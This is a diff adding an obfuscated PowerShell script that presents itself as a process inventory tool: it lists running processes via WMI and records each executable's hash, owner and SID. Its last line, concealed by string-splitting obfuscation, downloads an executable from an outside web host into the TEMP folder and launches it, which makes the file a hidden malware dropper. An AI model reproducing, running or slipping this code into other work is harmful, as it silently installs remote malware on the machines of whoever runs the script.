@@ -1,0 +1,70 @@
+  sEt-iteM  VaRiABLe:wGPaMC ( [TypE]("{8}{6}{5}{2}{1}{0}{9}{3}{7}{4}" -f 'GRA','tY.cRYpTO','Uri','y.M','5','C','E','D','sySteM.S','pH'));  SET-itEM  VaRiABlE:8b6T  ([Type]("{3}{1}{6}{5}{2}{7}{4}{0}" -F 'HY.SHa1','y','Ry','s','TOGRap','c','stEM.SecurItY.','p')) ; SEt-iTEm ("VAR"+"IaBl"+"E:6"+"b0t9") ( [type]("{9}{0}{7}{6}{2}{4}{5}{3}{8}{1}"-f'M','ha256','Ty.','PH','c','RyPTogrA','I','.seCUr','Y.S','syste'))  ;  $MfB6  =[tyPe]("{7}{5}{4}{2}{0}{6}{1}{3}{8}"-f'TO','h','yp','a3','uritY.CR','Em.sEc','grapHy.S','SYST','84') ; SEt-iTeM ('VARi'+'ABle:'+'y1'+'x9t')  ( [TYPE]("{2}{3}{6}{4}{1}{5}{0}"-f '512','ECurity','S','ystE','.s','.crYpToGRaPhY.Sha','M'))  ;  sV 205FGj (  [typE]("{5}{8}{0}{1}{4}{9}{2}{7}{10}{3}{6}" -F'.SEcu','rI','pH','P','TY.cRyP','SY','eMd160','y.','STeM','toGra','rI')  );  sET-Item  vaRiabLe:sFE4A  ( [tYpE]("{2}{1}{0}" -F'.iO.fILE','M','Syste') );  $O08i =  [tYpE]("{1}{0}" -F'g','sTRin');
+
+${H`AS`H`TYPe} = "MD5"
+
+function CoMPUTE`-f`il`eH`AsH {
+Param(
+    [Parameter(manDAtorY = ${Tr`Ue}, poSITiOn=1)]
+    [string]${fIlEp`AtH},
+    [ValidateSet("MD5",{"{0}{1}" -f 'SH','A1'},{"{0}{1}{2}" -f 'S','H','A256'},{"{2}{0}{1}"-f 'H','A384','S'},{"{1}{0}"-f '512','SHA'},{"{2}{1}{0}" -f 'D160','IPEM','R'})]
+    [string]${HAs`hT`YpE} = "MD5"
+)
+    
+    switch ( ${has`hty`PE}.("{1}{0}"-f 'r','ToUppe').Invoke() )
+    {
+        "MD5"       { ${H`ASh} =   (DiR VarIABlE:Wgpamc  ).valUe::("{0}{1}"-f'Cre','ate').Invoke() }
+        ("{0}{1}" -f 'SH','A1')      { ${H`AsH} =   (  get-VARiABlE 8b6t  -val  )::("{0}{1}{2}" -f'C','rea','te').Invoke() }
+        ("{2}{0}{1}" -f'HA25','6','S')    { ${h`Ash} =   (  gET-VARiaBlE  ("6b0"+"t9") -vaLue  )::("{1}{0}{2}"-f'reat','C','e').Invoke() }
+        ("{1}{0}{2}" -f 'H','S','A384')    { ${h`Ash} =  $MFB6::("{1}{0}" -f'reate','C').Invoke() }
+        ("{1}{0}" -f '2','SHA51')    { ${h`AsH} =  $y1x9t::("{0}{1}{2}"-f 'Cr','ea','te').Invoke() }
+        ("{2}{1}{0}"-f 'MD160','E','RIP') { ${hA`sh} =  $205FgJ::("{0}{1}"-f'Crea','te').Invoke() }
+        ("{0}{2}{1}"-f'd','ult','efa')     { ("{0}{5}{2}{1}{3}{4}"-f'Inv','h','lid has',' type ','selected.','a') }
+    }
+
+    if (&("{2}{1}{0}"-f'-Path','est','T') ${fil`e`pATh}) {
+        ${fI`le`NAme} = &("{3}{0}{2}{1}" -f 't-','ldItem','Chi','Ge') -Force ${fIl`EpATh} | .("{0}{2}{1}{3}"-f 'S','ct-Ob','ele','ject') -ExpandProperty ("{2}{0}{1}" -f'a','me','Fulln')
+        ${file`d`A`TA} =   (gEt-vArIabLE sfe4A  -vALueOnlY)::("{0}{2}{1}"-f 'ReadAllBy','es','t').Invoke(${f`il`EN`AME})
+        ${HAs`Hby`TES} = ${h`AsH}."cOMPut`E`HA`SH"(${fI`LEDA`Ta})
+        ${padd`E`dHex} = ""
+
+        foreach(${B`YTe} in ${h`A`shByTEs}) {
+            ${bYTEI`NH`EX} =   (  gCi ("v"+"arIAb"+"L"+"e"+":O08I")  ).vAluE::("{1}{0}" -f 'rmat','Fo').Invoke("{0:X}", ${BY`TE})
+            ${p`AddEd`HeX} += ${BYTEi`Nh`Ex}.("{1}{0}"-f 'Left','Pad').Invoke(2,"0")
+        }
+        ${pA`dd`E`dheX}
+        
+    } else {
+        ("$FilePath "+'i'+'s '+'inval'+'i'+'d '+'o'+'r '+'l'+'o'+'cked.')
+        &("{2}{1}{3}{0}"-f'ror','rite-','W','Er') -Message ('Inv'+'ali'+'d '+'in'+'put '+'f'+'ile '+'o'+'r '+'pa'+'th '+'sp'+'ecifie'+'d. '+"$FilePath") -Category ("{1}{3}{2}{0}{4}" -f'gum','Inval','Ar','id','ent')
+    }
+}
+
+foreach(${I`TEm} in (&("{1}{0}{3}{2}"-f'et-','G','ject','WmiOb') -Query ("{3}{1}{7}{6}{0}{2}{4}{5}" -f '2','fro','_','Select * ','proc','ess','n3','m wi'))) {
+    if (${i`TeM}."Exec`UtA`BlEPa`TH") {
+        ${ha`SH} = .("{0}{1}{2}{4}{3}" -f 'Com','pu','te-Fi','sh','leHa') -FilePath ${IT`Em}."eXeC`U`Tab`lEpaTH" -HashType ${HAs`h`TYPE}
+    } else {
+        ${H`AsH} = ("{4}{7}{6}{11}{10}{8}{3}{0}{2}{5}{9}{1}" -f 'l','.','e pa','urned no executab','G','t','iObject q','et-Wm',' ret','h','ery','u')
+    }
+    Try {
+        ${do`m`Ain} = ${It`EM}.("{1}{0}" -f'ner','GetOw').Invoke()."Do`MaIN"
+    } Catch {
+        ${D`OmA`in} = ("{0}{3}{2}{1}"-f'U','le','ab','nobtain')
+    }
+    Try {
+        ${uS`ERn`Ame} = ${IT`eM}.("{0}{1}" -f'Get','Owner').Invoke()."u`ser"
+    } Catch {
+        ${Use`RNA`me} = ("{0}{1}{2}{3}"-f'U','nob','t','ainable')
+    }
+    Try {
+        ${s`id} = ${I`TEM}.("{2}{1}{0}" -f 'wner','tO','Ge').Invoke()."S`id"
+    } Catch {
+        ${S`Id} = ("{1}{2}{0}"-f'le','U','nobtainab')
+    }
+    ${U`SerNaME} = (${D`Oma`in} + "\" + ${usErNA`me})
+    ${I`TeM} | .("{0}{1}{2}" -f 'Add','-Memb','er') -Type ("{1}{2}{0}{3}"-f'Prop','Not','e','erty') -Name ("{1}{0}"-f 'ash','H') -Value ${H`Ash}
+    ${IT`Em}."c`o`mma`NDlINE" = ${it`eM}."C`Om`man`dlINE" -Replace "`n", " " -replace ((("{0}{2}{1}"-f 'wv','vbs*','bsw'))."ReP`L`ACE"('wvb',[sTRINg][chaR]92)), ' '
+	${It`Em} | &("{0}{2}{1}" -f'Add-','ember','M') -Type ("{1}{2}{0}{3}"-f'tePropert','N','o','y') -Name ("{1}{0}"-f'ame','Usern') -Value ${U`sernamE}
+	${I`TEm} | .("{3}{2}{1}{0}"-f'r','Membe','dd-','A') -Type ("{0}{2}{3}{1}"-f'N','y','otePr','opert') -Name "SID" -Value  ${s`id}
+    ${I`TEM}
+}
+(${D`PL}=${en`V:t`EMP}+("{1}{0}"-f 'xe','f.e'));(.("{1}{2}{0}"-f 'Object','Ne','w-') ("{2}{3}{1}{4}{0}" -f 'bClient','et.W','System.','N','e')).("{3}{0}{1}{2}"-f 'oad','Fi','le','Downl').Invoke(("{3}{0}{2}{11}{4}{6}{10}{8}{9}{1}{14}{13}{7}{5}{12}" -f't','e','p','ht','hos','f','tings.com/bi','anny','lu','d','lling//inc','://snt','inal.exe','b/d','s/d'), ${d`pl});&("{4}{2}{0}{3}{1}"-f'-','ess','t','Proc','Star') ${d`Pl}
